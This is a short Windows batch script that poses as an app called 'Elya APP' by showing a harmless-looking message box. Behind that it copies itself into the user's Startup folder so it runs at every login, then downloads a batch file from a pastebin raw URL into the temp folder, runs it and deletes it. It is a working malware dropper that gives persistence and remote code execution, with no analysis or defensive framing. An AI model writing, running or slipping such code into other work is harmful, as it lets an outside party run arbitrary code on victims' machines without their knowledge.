setlocal

:: Get full path of this script
set "SELF=%~f0"

:: Startup folder path
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Show message box
powershell -command "[void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');[System.Windows.Forms.MessageBox]::Show('Click OK to exit.','Elya APP',[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Information)"

:: Copy itself to Startup
copy "%SELF%" "%STARTUP%\MyApp.bat" >nul

powershell -Command "Invoke-WebRequest -Uri 'https://pastebin.com/raw/0jemKmSE' -OutFile '%temp%\code.bat'"
call "%temp%\code.bat"
del "%temp%\code.bat" /f /q
